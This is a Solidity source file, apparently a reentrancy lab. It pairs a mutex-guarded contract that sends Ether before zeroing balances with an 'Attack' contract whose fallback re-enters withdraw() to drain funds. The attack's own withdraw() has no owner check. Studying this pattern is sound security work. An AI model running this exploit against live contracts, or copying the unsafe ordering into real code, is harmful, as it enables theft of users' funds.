// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // mutex
    // see: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol
    bool locked;

    function withdraw() public {
        require(!locked, "Reentrant call detected");
        locked = true; // Set the lock to prevent reentrancy
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
        locked = false; // Reset the lock after the withdrawal is complete
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ether to attack");
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();
        }
    }

    // receive() external payable {
    //     if (address(reentrantVulnerable).balance >= 1 ether) {
    //         reentrantVulnerable.withdraw();
    //     }
    // }

    function withdraw() external {
        uint256 amount = address(this).balance;
        require(amount > 0, "No balance to withdraw");
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Withdraw failed");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
